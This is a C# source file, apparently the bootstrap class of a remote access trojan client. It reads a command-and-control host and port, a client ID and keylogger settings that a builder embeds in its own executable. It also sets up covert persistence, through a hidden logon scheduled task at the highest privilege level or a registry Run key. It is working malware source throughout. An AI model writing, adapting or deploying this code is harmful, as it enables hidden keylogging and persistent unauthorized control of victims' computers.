using Client.Models;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Client.Controllers.Tools
{
    //BootController
    public class Boot
    {
        //Thread Deco
        public Socket socket;
        public IPEndPoint iep;
        public TextWriter tw;
        public TcpClient clientReconnectTries;
        public bool clientLog;
        public bool stopReconnectTries;
        private string[] readerFactory = { "host", "port", "recoTries", "clientID", "klEnabled", "klDirectory", "autoStart", "startupName"};

        public string host { get; set; }
        public ushort port { get; set; }
        public int numReconnectTries { get; set; }
        public static string clientID { get; set; }
        public bool klEnabled { get; set; }
        public string klDirectory { get; set; }
        public bool autoStart { get; set; }
        public static string startupName { get; set; }



        public Boot()
        {
            foreach (string index in readerFactory)
            {
                doSomethingWithReader(index);
            }
        }

        public static string getMutexKey(StreamReader readerMutex)
        {
            string mutex = readerMutex.ReadToEnd();
            mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
            string mutexKey = mutex.Replace("-STARTmutex-", "");
            return mutexKey;
        }

        public void doSomethingWithReader(string readerFactoIndex)
        {
            StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
            
            string readerString = reader.ReadToEnd();

            readerString = readerString.Substring(readerString.IndexOf("-START" + readerFactoIndex + "-"), readerString.IndexOf("-END" + readerFactoIndex + "-") - readerString.IndexOf("-START" + readerFactoIndex + "-"));

            if (readerFactoIndex == "host")
            {
                host = readerString.Replace("-START" + readerFactoIndex + "-", "");
            }
            else if (readerFactoIndex == "port")
            {
                port = ushort.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
            }
            else if (readerFactoIndex == "recoTries")
            {
                numReconnectTries = int.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
            }
            else if (readerFactoIndex == "clientID")
            {
                clientID = readerString.Replace("-START" + readerFactoIndex + "-", "");                
            }
            else if (readerFactoIndex == "klEnabled")
            {
                klEnabled = (readerString.Replace("-START" + readerFactoIndex + "-", "") == "True" ? true : false);
            }
            else if (readerFactoIndex == "klDirectory")
            {
                klDirectory = readerString.Replace("-START" + readerFactoIndex + "-", "");
            }
            else if(readerFactoIndex == "autoStart")
            {
                autoStart = (readerString.Replace("-START" + readerFactoIndex + "-", "") == "True" ? true : false);
            }
            else if (readerFactoIndex == "startupName")
            {
                startupName = readerString.Replace("-START" + readerFactoIndex + "-", "");
            }
            else
            {
                reader.Close();
                return;
            }

            reader.Close();
        }

        public static bool AddToStartup()
        {
            if (AuthenticationController.getAccountType() == "Admin")
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + ClientData.currentPath + "\" /rl HIGHEST /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
                    true);
            }
            else
            {
                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
                    true);
            }
        }
    }
}
